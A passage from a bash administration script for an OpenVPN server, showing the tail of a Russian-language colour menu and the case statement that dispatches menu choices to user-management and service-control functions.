${Blue}|12.${Font_color_suffix} ${Yellow}Выключить OpenVPN${Font_color_suffix}               ${Blue}|${Font_color_suffix}
${Blue}|13.${Font_color_suffix} ${Yellow}Перезапустить OpenVPN${Font_color_suffix}           ${Blue}|${Font_color_suffix}
${Blue}|14.${Font_color_suffix} ${Yellow}Обновить OpenVPN${Font_color_suffix}                ${Blue}|${Font_color_suffix}
${Blue}|15.${Font_color_suffix} ${Yellow}Доп.функции${Font_color_suffix}                     ${Blue}|${Font_color_suffix}
${Blue}|16.${Font_color_suffix} ${Yellow}Выйти${Font_color_suffix}                           ${Blue}|${Font_color_suffix}
${Blue}|------------------------------------|${Font_color_suffix}"

menu_status
	read -p "Действие: " option
	#until [[ "$option" =~ ^[1-12]+$ ]]; do
		#echo "$option: Выбор неверный"
		#read -p "Действие: " option
	#done
	case "$option" in
		1)
		adduser
		;;
		2)
		deleteuser
		;;
		3)
		get_users_list
		;;
		4)
		showlink
		;;
    5)
		ip_list
		;;
		6)
		filter_delete
		;;
		7)
		uploadbase
		;;
    8)
    dwnlndbase
    ;;
	 	9)
		change_domain
		;;
		10)
		uninstallovpn
		;;
    11)
    start_openvpn
    ;;
    12)
    stop_openvpn
    ;;
    13)
    restart_openvpn
    ;;
    14)
    update_openvpn
    ;;
    15)
    Additional
    ;;
    16)
    fastexit
    ;;
	  *)
	esac
fi
    else
      locking
      #echo "Script has been blocked!" && exit

fi
